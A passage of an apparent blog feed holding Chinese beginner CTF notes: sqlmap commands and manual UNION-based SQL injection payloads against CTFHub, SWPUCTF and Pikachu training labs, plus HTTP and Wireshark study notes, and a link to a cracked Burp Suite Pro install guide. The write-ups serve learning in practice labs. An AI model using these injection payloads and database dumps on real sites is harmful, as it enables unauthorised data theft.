0yst3r - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-技能树-SQL注入</title>
    <link href="/2024/05/14/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/05/14/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>sqlmap的一些常用方法：</strong></p><table><thead><tr class="header"><th>参数</th><th>描述</th></tr></thead><tbody><tr class="odd"><td><code>-u &lt;URL&gt;</code></td><td>指定注入链接为 <code>&lt;URL&gt;</code></td></tr><tr class="even"><td><code>--dbs</code></td><td>查看所有数据库数据</td></tr><tr class="odd"><td><code>--current-db</code></td><td>查看当前使用的数据库</td></tr><tr class="even"><td><code>-D &lt;name&gt;</code></td><td>指定搜索的数据库为 <code>&lt;name&gt;</code></td></tr><tr class="odd"><td><code>-T &lt;name&gt;</code></td><td>指定搜索的表为 <code>&lt;name&gt;</code></td></tr><tr class="even"><td><code>--tables</code></td><td>查看数据表信息</td></tr><tr class="odd"><td><code>--dump</code></td><td>获取字段内容，即获取数据</td></tr><tr class="even"><td></td><td></td></tr><tr class="odd"><td></td><td></td></tr><tr class="even"><td><code>-r &lt;filename&gt;</code></td><td>指定注入网站的 HTTP 请求为 <code>&lt;filename&gt;</code>文本文件中的内容</td></tr><tr class="odd"><td><code>--columns</code></td><td>获取列信息</td></tr><tr class="even"><td><code>-C &lt;name&gt;</code></td><td>指定搜索的列为 <code>&lt;name&gt;</code></td></tr><tr class="odd"><td><code>--level &lt;num&gt;</code></td><td>指定搜索等级为 <code>&lt;num&gt;</code></td></tr><tr class="even"><td><code>--cookie "&lt;string&gt;"</code></td><td>指定访问网页时的 Cookie 为 <code>&lt;string&gt;</code></td></tr><tr class="odd"><td><code>-p "&lt;string&gt;"</code></td><td>指定测试的类型为 <code>&lt;string&gt;</code></td></tr><tr class="even"><td><code>--tamper "&lt;filename&gt;"</code></td><td>附加名为 <code>&lt;filename&gt;</code> 的脚本</td></tr></tbody></table><h2 id="字符型注入">字符型注入</h2><blockquote><p>这里我尝试用一个新的工具——sqlmap，来解题</p></blockquote><p>由CSDN，可知步骤如下：</p><p>① 查当前数据库：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://challenge-f20ac55e6a171116.sandbox.ctfhub.com:10800/?id=1&quot;</span> <span class="hljs-attr">--current-db</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141604903.png"alt="查当前数据库" /><figcaption aria-hidden="true">查当前数据库</figcaption></figure><blockquote><p>其实前面还有一堆东西，但是我现在都还看不懂</p></blockquote><p>② 查数据表：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://challenge-f20ac55e6a171116.sandbox.ctfhub.com:10800/?id=1&quot;</span> -D sqli <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141606970.png"alt="查数据表" /><figcaption aria-hidden="true">查数据表</figcaption></figure><p>③ 查具体数据，即flag</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://challenge-f20ac55e6a171116.sandbox.ctfhub.com:10800/?id=1&quot;</span> -D sqli -T flag <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141608413.png"alt="查具体数据" /><figcaption aria-hidden="true">查具体数据</figcaption></figure><h2 id="报错注入">报错注入</h2><h3 id="法一">法一</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">python sqlmap.py -u <span class="hljs-string">&quot;http://challenge-f20ac55e6a171116.sandbox.ctfhub.com:10800/?id=1&quot;</span> -D sqli -T flag <span class="hljs-comment">--dump</span><br><span class="hljs-comment"># 又报错了，发！！！</span><br><span class="hljs-comment"># 不知道为啥，反正sqlmap的使用总是有时候报错，难道是这个开启了一些其他的，导致不能用sqlmap了吗</span><br></code></pre></td></tr></table></figure><h2 id="法二">法二</h2><p>[<ahref="https://blog.nowcoder.net/n/31857615c9a544dda1e1f5e427f0272a">ctfhub]SQL注入总结_牛客博客(nowcoder.net)</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web-CTF-sql一些题</title>
    <link href="/2024/05/13/Web-CTF-sql%E4%B8%80%E4%BA%9B%E9%A2%98/"/>
    <url>/2024/05/13/Web-CTF-sql%E4%B8%80%E4%BA%9B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="swpuctf-2021-新生赛easy_sql">[SWPUCTF 2021 新生赛]easy_sql</h2><h3 id="法一传统派">法一（传统派）</h3><p>① my四步，判断出是字符型注入</p><blockquote><p>?wllm=1 and 1=1 显示正常</p><p>?wllm=1 and 1=2 显示正常</p><p>说明不是数字型</p></blockquote><blockquote><p>?wllm=1' and 1=1 --+ 回显正确</p><p>?wllm=1' and 1=2 --+ 回显错误</p><p>说明是字符型</p></blockquote><p>② 使用判断order by 判断表的列数：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">wllm=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span>--+ 正常返回<br>?<span class="hljs-attr">wllm=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span>--+ 错误返回，说明有三列<br></code></pre></td></tr></table></figure><p>③ 确定显示的字段顺序：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">/?wllm=<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+      </span><br>根据页面显示可以发现没有回显位，转变思路为报错注入<br>这里可以按报错注入来搞，但大部分师傅我看是直接把<span class="hljs-number">1</span>改成了-<span class="hljs-number">1</span>，继续进行<br></code></pre></td></tr></table></figure><p>下面这个师傅是按报错注入来搞的</p><p>[<ahref="https://blog.csdn.net/2301_80358831/article/details/137924636">SWPUCTF2021 新生赛]easy_sql-CSDN博客</a></p><p>我还是先按照正常的来走</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">输入?wllm=-1&#x27; union select 1,2,3--+ 查看回显<br><span class="hljs-meta prompt_"># </span><span class="language-bash">至于这里为什么要改成-1，我搜到了下面的一些解释：</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">union <span class="hljs-keyword">select</span> 1,2,3发现不能回显出指定的1，2，3，因为指定位被<span class="hljs-built_in">id</span>=3的数据占满了，因此将参数改为一个数据库不存在的<span class="hljs-built_in">id</span>值-1，就有回显位了。再次插入union <span class="hljs-keyword">select</span> 1,2,3发现2,3出现在页面上，说明这两个显示位可以被利用</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">总的来说，是我们需要利用报错得到回显位</span><br></code></pre></td></tr></table></figure><p>④ 查询数据库名</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?wllm=-<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141632117.png"alt="查询数据库名" /><figcaption aria-hidden="true">查询数据库名</figcaption></figure><p>⑤ 根据查询到的数据库，查看库中有什么表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">wllm</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;test_db&#x27;</span>--+<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141632005.png"alt="查数据表" /><figcaption aria-hidden="true">查数据表</figcaption></figure><p>⑥ 查询表中的字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">wllm</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;test_db&#x27;</span>--+<br><br>?<span class="hljs-attribute">wllm</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141634019.png"alt="test_db中的字段" /><figcaption aria-hidden="true">test_db中的字段</figcaption></figure><p>⑦ 然后直接查询test_tb表得到我们想要的flag</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?wllm=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,flag <span class="hljs-keyword">from</span> test_tb --+<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141635914.png"alt="查询flag" /><figcaption aria-hidden="true">查询flag</figcaption></figure><h3 id="法二维新派">法二（维新派）</h3><p>本题用我新学的sqlmap可直接秒，emmmm🧐🧐🧐🧐</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405141656905.png"alt="sqlmap秒了" /><figcaption aria-hidden="true">sqlmap秒了</figcaption></figure><blockquote><p>——2024.05.14. 16:55</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web-CTF-SQL注入刷题总结</title>
    <link href="/2024/05/13/Web-CTF-SQL%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2024/05/13/Web-CTF-SQL%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="区分数字型注入和字符型注入">1. 区分数字型注入和字符型注入</h2><p><ahref="https://zhuanlan.zhihu.com/p/691070551">了解数值型注入和字符型注入- 知乎 (zhihu.com)</a></p><p>数字型注入：</p><p>输入的参数为整形，输入参数一般为ID值，年龄，页码等，一般不需要单引号闭合。</p><p>字符型注入：</p><p>输入的参数为整形，将输入值作为字符串进行传递，一般需要单引号闭合。</p><p>区分SQL注入漏洞类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入 8 and 1=1<br>HTTP://www.xxser.com/test.php?<span class="hljs-built_in">id</span>=8 and 1=1<br>数字型：<span class="hljs-keyword">select</span> * from table <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=8 and 1=1<br>语句执行正常，返回数据与原始请求无任何差异<br><br>字符型：<span class="hljs-keyword">select</span> * from table <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>= <span class="hljs-string">&#x27;8 and 1=1&#x27;</span><br>语句执行异常，无法返回正确值<br></code></pre></td></tr></table></figure><p><strong>数字型注入判断</strong>：</p><blockquote><p>使用经典的and 1=1 and 1=2</p><p>?id=1 and 1=1 显示正常</p><p>?id=1 and 1=2 显示错误</p><p>说明存在数字型注入</p></blockquote><p><strong>字符型注入（需闭合）判断：</strong></p><blockquote><p>?id=1' and 1=1 --+ 回显正确</p><p>?id=1' and 1=2 --+ 回显错误</p><p>说明存在字符型注入</p></blockquote><p>判断的时候直接把上面的四个都试一遍，看符合哪个</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">--+ ：注释，是为了注释多余的 &#x27;)，若不注释掉，则还会报错<br>   即：select * from users where id=(&#x27;&#x27;)<br>      select * from users where id=(&#x27;1&#x27;) and 1=1 --+&#x27;)<br></code></pre></td></tr></table></figure><h2 id="和在sql有什么区别">2. --和#在sql有什么区别</h2><blockquote><p>在字符型注入中，会用到下面的语句，?wllm=1' order by 3--+</p></blockquote><p>在SQL中， <strong>--</strong> 和 <strong>#</strong>都用作单行注释，但它们的使⽤环境和数据库系统兼容性有些不同。</p><p><code>-</code> ：这是SQL标准的单行注释符号。大多数SQL数据库，包括SQLServer、PostgreSQL和MySQL，都⽀持使⽤ <strong>-</strong>进⾏单⾏注释。通常， <strong>-</strong> 后⾯需要跟⼀个空格。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-comment">-- 这是⼀个注释</span><br></code></pre></td></tr></table></figure><p><code>#</code>：这是MySQL特有的单⾏注释符号。它不是SQL标准的⼀部分，所以在其他数据库系统（如SQLServer或PostgreSQL）中可能不会被识别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> # 这也是⼀个注释，但仅在MySQL中有效<br></code></pre></td></tr></table></figure><p>如果你的代码只需要在MySQL中运行，使用#是没有问题的。但如果你希望你的SQL代码能在不同的数据库系统中运行，最好使用标准的-- 注释。</p><p>总结一下, -- 更具有通用性，而#是MySQL特有的。如果你在编写数据库无关的代码，最好使用--。</p><h2 id="为什么要加">3. 为什么要加+</h2><blockquote><p>在字符型注入中，会用到下面的语句，?wllm=1' order by 3--+</p></blockquote><p>在某些SQL解析器和数据库管理系统(如MariaDB、MySQL等)中，<code>--</code>后面需要跟一个空格才能被识别为SQL注释。在URL中，由于空格通常会被去掉或需要编码(通常为<code>%20</code>或<code>+</code>)，所以直接使用一个空格可能会导致SQL语法错误。</p><p>在这种情况下，添加<code>+</code>实际上是在确保注释<code>--</code>后面有一个空格，这样数据库就能正确解析这个SQL注释。因此，<code>--+</code>实际上是<code>--空格</code>(两个短划线后面跟一个空格)的URL编码形式。</p><p>这就解释了为什么在这个具体例子中，不加+会导致SQL语法错误：数据库在解析SQL时没有把<code>--</code>识别为注释，因为它后面没有跟空格。而加上+后，数据库就能正确地把<code>--</code>识别为注释。</p><h2 id="burp-suite2023完美安装">4. Burp Suite2023完美安装</h2><blockquote><p>本人自从知道了新版本有高亮，就再也不想用老版本，搞了半天，终于在各种乱七八糟的教程中搜到了我能实操的</p><p>感谢下面的两位师傅：</p><p><a href="https://zhuanlan.zhihu.com/p/671358251">Burp Suite专业版-2023.10(激活教程附包) - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/lytanz/p/15247481.html">burp suit文本不能精确选中的原因 - ly探长 - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web-CTF-基础知识</title>
    <link href="/2024/05/10/Web-CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/05/10/Web-CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>首先是《(图灵程序设计丛书) 上野宣 - 图解HTTP-人民邮电出版社(2014)》这本书的一些内容</p></blockquote><h2 id="section"></h2><h2 id="告知服务器意图的-http-方法">2.5 告知服务器意图的 HTTP 方法</h2><p><strong>GET：获取资源</strong></p><p>GET 方法用来请求访问已被 URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGI（Common GatewayInterface，通用网关接口）那样的程序，则返回经过执行后的输出结果。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101502669.png"alt="GET方法" /><figcaption aria-hidden="true">GET方法</figcaption></figure><p><strong>POST：传输实体主体</strong></p><p>POST 方法用来传输实体的主体。</p><p>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET方法进行传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但POST的主要目的并不是获取响应的主体内容。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101504740.png"alt="POST方法" /><figcaption aria-hidden="true">POST方法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101504825.png"alt="POST方法" /><figcaption aria-hidden="true">POST方法</figcaption></figure><h2 id="通信数据转发程序代理网关隧道">5.2通信数据转发程序：代理、网关、隧道</h2><p>HTTP通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。</p><p>这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且能接收从那台服务器发送的响应再转发给客户端。</p><p>代理</p><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p><p>网关</p><p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。</p><p>隧道</p><p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101521849.png"alt="代理" /><figcaption aria-hidden="true">代理</figcaption></figure><p>代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求URI，会直接发送给前方持有资源的目标服务器。</p><p>持有资源实体的服务器被称为源服务器。从源服务器返回的响应经过代理服务器后再传给客户端。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101522956.png"alt="代理" /><figcaption aria-hidden="true">代理</figcaption></figure><p>在 HTTP通信过程中，可级联多台代理服务器。请求和响应的转发会经过数台类似锁链一样连接起来的代理服务器。转发时，需要附加Via首部字段以标记出经过的主机信息。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101522919.png"alt="代理" /><figcaption aria-hidden="true">代理</figcaption></figure><p>使用代理服务器的理由有：利用缓存技术（稍后讲解）减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要</p><p>目的，等等。</p><p>代理有多种使用方法，按两种基准分类。一种是是否使用缓存，另一种是是否会修改报文。</p><p><strong>缓存代理</strong></p><p>代理转发响应时，缓存代理（CachingProxy）会预先将资源的副本（缓存）保存在代理服务器上。</p><p>当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。</p><p><strong>透明代理</strong></p><p>转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（TransparentProxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101523741.png"alt="网关" /><figcaption aria-hidden="true">网关</figcaption></figure><p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP协议服务。</p><p>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在 Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405101524578.png"alt="5.2.3 隧道" /><figcaption aria-hidden="true">5.2.3 隧道</figcaption></figure><p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。</p><p>隧道本身不会去解析 HTTP请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入各种靶场训练</title>
    <link href="/2024/05/06/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/"/>
    <url>/2024/05/06/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="pikachu">Pikachu</h1><h2 id="数字型注入post">数字型注入（post）</h2><p>随意点击一个数字1，点击查询，会出现如下结果：</p><p><strong>url中没有传参，提交方式为post。</strong>（这个还需要我再深入理解，待我看完《图解HTTP》）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062301520.png"alt="随意点击一个数字1" /><figcaption aria-hidden="true">随意点击一个数字1</figcaption></figure><p>这里我主要记录一下怎么用Burp Suite抓包，来解决这个问题</p><p>① 首先打开火狐的代理</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062309427.png"alt="打开火狐的代理" /><figcaption aria-hidden="true">打开火狐的代理</figcaption></figure><p>② 打开burp的拦截</p><p>注意下面这个状态是拦截禁用：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062309626.png"alt="拦截禁用" /><figcaption aria-hidden="true">拦截禁用</figcaption></figure><p>这个状态是拦截请求开启：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062310994.png"alt="拦截请求开启" /><figcaption aria-hidden="true">拦截请求开启</figcaption></figure><p>③ 然后再点击数字1，进行查询，这是burp就会自动进行抓包了</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062311888.png"alt="任务栏图标会变红" /><figcaption aria-hidden="true">任务栏图标会变红</figcaption></figure><p>下面就说明抓包成功：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062312004.png"alt="抓包成功" /><figcaption aria-hidden="true">抓包成功</figcaption></figure><p>④全选，然后右键选择发送到Repeater（重发器），构造payload，然后点击发送。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>1=1永远为true，所以将会遍历出所有用户的邮箱。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062313974.png"alt="Repeater构造payload" /><figcaption aria-hidden="true">Repeater构造payload</figcaption></figure><p>点击Render，发现查询出了所有用户的邮箱。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405062314640.png"alt="点击Render" /><figcaption aria-hidden="true">点击Render</figcaption></figure><blockquote><p>这就是用burp完成一个简单的SQL注入的过程，第一次还是遇到了一点问题的，所以记录一下</p><p>😴😴不过这里好像有些过于简单了，我看别的师傅查询所以内容的过程会更复杂一点</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark抓包初体验</title>
    <link href="/2024/05/05/Wireshark%E6%8A%93%E5%8C%85%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/05/05/Wireshark%E6%8A%93%E5%8C%85%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="一简介">一、简介</h2><p>Wireshark是一款非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。</p><p>为了安全考虑，Wireshark只能查看封包，而<strong>不能修改封包的内容</strong>，或者发送封包。</p><p>Wireshark能获取HTTP，也能获取HTTPS，但是不能解密HTTPS，所以<strong>wireshark看不懂HTTPS中的内容</strong></p><h2 id="二实验任务">二、实验任务</h2><p>完成对百度的抓包，获取三次TCP握手的包，同时写清楚过滤条件</p><blockquote><p>本次实验只是简单的进行一次抓包，主要是了解Wireshark这个软件的简单使用</p></blockquote><h2 id="三实验过程及结果">三、实验过程及结果</h2><p>① 勾选【WLAN2】网卡，点击【开始】，启动抓包。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405052254665.png"alt="开始抓包" /><figcaption aria-hidden="true">开始抓包</figcaption></figure><p>wireshark启动后，wireshark处于抓包状态中。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405052254301.png"alt="wireshark处于抓包状态" /><figcaption aria-hidden="true">wireshark处于抓包状态</figcaption></figure><p>②如果我们想获取百度相关的包，可以设置过滤条件<code>ip.addr == 39.156.66.10</code></p><p>这个IP地址是通过在window CMD命令行ping baidu.com，得到的：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405052258591.png"alt="ping baidu.com" /><figcaption aria-hidden="true">ping baidu.com</figcaption></figure><p>这时Wireshark就已经开始抓包了：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405052258115.png"alt="抓包百度" /><figcaption aria-hidden="true">抓包百度</figcaption></figure><p>③ 下面我们可以在浏览器中输入<code>39.156.66.10/s?word=java</code></p><p>这时Wireshark界面就发生了变化：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405052306339.png"alt="TCP三次握手" /><figcaption aria-hidden="true">TCP三次握手</figcaption></figure><p>解释如下：</p><ol type="1"><li>IP地址为10.45.246.179的客户端，发送序列号为Seq=0的报文给IP地址为39.156.66.10的服务器，此为第一次握手；</li><li>服务器收到该报文后，返回一个确认号为Ack=1,序列号为Seq=0的SYN+ACK的报文给客户端，此为第二次握手；</li><li>客户端收到来自服务器的响应报文，会将里面的序列号加1赋给新的Ack，同时将里面的Ack赋给新的Seq，即回复一个Seq=1,Ack=1的ACK报文给服务器，此为第三次握手。</li></ol><p>注：IP地址为10.45.246.179的客户端可以通过在CMD窗口输入<code>ipconfig/all</code>来查看</p><blockquote><p>本次实验只是对Wireshark的简单尝试使用（最后的三次握手虽然找到了在哪，但是似乎握手失败了），</p><p>如果中间存在错误请老师批评指正</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web-CTF-SQL注入基础知识</title>
    <link href="/2024/04/21/Web-CTF-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/04/21/Web-CTF-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
